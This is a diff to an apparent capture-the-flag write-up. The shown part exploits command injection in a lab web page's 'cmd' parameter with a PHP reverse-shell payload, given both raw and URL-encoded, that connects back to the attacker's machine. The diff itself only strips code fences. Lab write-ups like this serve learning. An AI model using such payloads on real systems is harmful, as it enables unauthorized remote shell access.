@@ -74,16 +74,16 @@ MAC Address: 02:B3:8F:7B:A4:5B (Unknown)
 
 ```
 http://10.10.254.41/assets/index.php?cmd=php -r '$sock=fsockopen("10.10.105.73", 1984);exec("sh <&3 >&3 2>&3");'
-```
+
 ![revshellurlEncode](https://github.com/user-attachments/assets/6a0b0861-e3a3-4909-9193-c997e8e3f368)
 
 </br> dang it, doesn't work....
 </br> I need to go to revshells.com and url encode this junk...
 </br> It's a command injection, so that should be a PHP exec situation.
 </br> (different IP because new session started, dumb timeouts...)
-```
+
 http://10.10.4.218/assets/index.php?cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.10.152.50%22%2C1984)%3Bexec(%22sh%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
-```![revshellurlEncode](https://github.com/user-attachments/assets/707d75d4-eb4a-49c4-b498-4af114246678)
+![revshellurlEncode](https://github.com/user-attachments/assets/707d75d4-eb4a-49c4-b498-4af114246678)
 </br> make sure to click the url encode button on rev shells if you're doing a url injection.
 </br> ![executeINUrlImg](https://github.com/user-attachments/assets/edec1121-9999-4699-a31b-289d034239a0)
 </br> when it hangs, we should get a proper connection
